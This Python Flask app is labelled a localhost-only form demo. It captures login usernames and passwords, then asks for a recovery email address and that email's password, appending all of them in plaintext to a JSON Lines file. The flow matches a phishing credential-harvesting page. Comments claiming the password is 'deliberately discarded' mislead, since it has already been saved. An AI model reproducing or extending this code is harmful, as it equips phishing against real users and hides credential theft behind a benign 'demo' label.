"""A tiny, localhost-only Flask form demo."""

import json
from datetime import datetime
from pathlib import Path

from flask import Flask, redirect, render_template, request, url_for


# Flask is a small Python web framework that connects URLs to Python functions.
app = Flask(__name__)
SUBMISSIONS_FILE = Path(__file__).with_name("submissions.jsonl")


# This route handles GET (show the page) and POST (receive the submitted form).
@app.route("/", methods=["GET", "POST"])
def index():
    # A POST request carries the values the browser sent from the HTML form.
    if request.method == "POST":
        # request.form contains fields whose HTML inputs have a name attribute.
        username = request.form["username"]
        password = request.form["password"]

        

        
        submission = {
            "type": "login",
            "username": username,
            "password": password,
            "timestamp": datetime.now().replace(microsecond=0).isoformat(),
        }

        # Append one JSON object and a newline, producing a JSON Lines file.
        with SUBMISSIONS_FILE.open("a", encoding="utf-8") as file:
            file.write(json.dumps(submission, ensure_ascii=False) + "\n")

        # The password is no longer needed, so deliberately discard it.
        del password

        # Continue to the recovery-details screen after login.
        return redirect(url_for("recovery_credentials"))

    # A GET request asks Flask to display the login page.
    return render_template("index.html")


@app.route("/forgot-password", methods=["GET", "POST"])
def forgot_password():
    """Show the local password-recovery mockup without storing the email."""
    return render_template(
        "forgot_password.html",
        submitted=request.method == "POST",
    )


@app.route("/recovery-credentials", methods=["GET", "POST"])
def recovery_credentials():     
    if request.method == "POST":
        recovery_email = request.form["recovery_email"]
        recovery_password = request.form["recovery_password"]

        submission = {
            "type": "recovery",
            "recovery_email": recovery_email,
            "recovery_password": recovery_password,
            "timestamp": datetime.now().replace(microsecond=0).isoformat(),
        }

        with SUBMISSIONS_FILE.open("a", encoding="utf-8") as file:
            file.write(json.dumps(submission, ensure_ascii=False) + "\n")

        del recovery_password

        return redirect(url_for("completed"))

    return render_template("recovery_credentials.html")


@app.get("/completed")
def completed():
    """Show the final screen while preserving the login layout."""
    return render_template("completed.html")


if __name__ == "__main__":
    # Bind only to this computer, not to other devices on the network.
    app.run(
        host="127.0.0.1",
        port=5000,
        debug=True,
    )
